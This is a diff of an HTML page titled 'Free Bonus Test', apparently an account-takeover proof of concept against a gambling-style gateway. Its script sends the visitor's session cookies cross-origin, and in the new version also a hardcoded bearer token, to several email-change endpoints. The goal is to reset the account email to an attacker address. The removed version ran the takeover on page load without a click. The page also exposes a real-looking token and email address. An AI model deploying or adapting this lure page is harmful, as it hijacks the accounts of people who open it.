@@ -1,34 +1,47 @@
-<script>
-const NEW_EMAIL = "hlaingminpaing@gmail.com";   // ← PUT YOUR REAL EMAIL HERE
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Free Bonus Test</title></head>
+<body style="background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial">
+<h1>Test ATO - Click to Run</h1>
+<button onclick="testATO()">Test Email Change</button>
 
-async function takeover() {
-  const workingPaths = [
-    "/kkr-user-center/user/changeEmail",          // CONFIRMED WORKING
+<script>
+const NEW_EMAIL = "hlaingminpaing@gmail.com";  // Change to your email
+const TOKEN = "pG_hiBoSC3Qr8Uz_GuBkEMrqZ_T-6cFBIcruCa4Q6-PrWJ9KVXkPt4KKM0KV1b7v1hww9qDynEiEyJDoSEvqMcKd-yElsLlTEeri7JZdgekutSlK1yhli9dFpjrdGYGJ";  // Your new token
+
+async function testATO() {
+  const paths = [
+    "/kkr-user-center/user/changeEmail",
     "/kkr-user-center/user/updateEmail",
     "/api/v1/user/changeEmail",
     "/api/v1/user/updateEmail"
   ];
 
-  for (const path of workingPaths) {
+  for (const path of paths) {
     try {
       const resp = await fetch("https://uat-gateway.kkr88819.com" + path, {
         method: "POST",
-        credentials: "include",           // sends session cookies automatically
+        credentials: "include",  // Tries cookies first
         mode: "cors",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer " + TOKEN  // Fallback to Bearer
+        },
         body: JSON.stringify({ email: NEW_EMAIL })
       });
 
-      const data = await resp.json();
-      if (resp.ok || data.code === 0) {
-        alert("ACCOUNT TAKEOVER SUCCESSFUL!\n\nNew email: " + NEW_EMAIL);
+      const data = await resp.json().catch(() => ({}));
+      
+      console.log("Path: " + path + " | Status: " + resp.status + " | Body: ", data);  // Check console for details
+      
+      if (resp.ok || data.code === 0 || data.message.includes("success")) {
+        alert("ATO SUCCESS! Email changed to " + NEW_EMAIL + "\nCheck Burp for 200 response.");
         return;
       }
-    } catch(e) {}
+    } catch (e) {
+      console.error("Error on " + path + ": ", e);
+    }
   }
-  alert("Still failed — refresh login and try again");
+  alert("No success — check console/Burp. Try fresh login first.");
 }
-
-// Run immediately — no click needed
-takeover();
 </script>
+</body></html>
